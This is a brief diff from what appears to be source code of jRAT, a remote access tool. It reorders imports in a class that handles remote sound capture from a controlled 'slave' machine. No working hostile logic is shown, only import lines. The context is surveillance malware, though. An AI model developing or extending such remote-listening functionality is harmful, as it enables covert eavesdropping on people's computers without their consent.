@@ -6,11 +6,11 @@ import jrat.common.utils.DataUnits;
 import jrat.controller.Slave;
 import jrat.controller.ui.dialogs.DialogRemoteSoundCapture;
 
-import java.io.DataInputStream;
 import javax.sound.sampled.AudioFormat;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.DataLine;
 import javax.sound.sampled.SourceDataLine;
+import java.io.DataInputStream;
 
 
 public class Packet58ServerDownloadSoundCapture extends AbstractIncomingPacket {
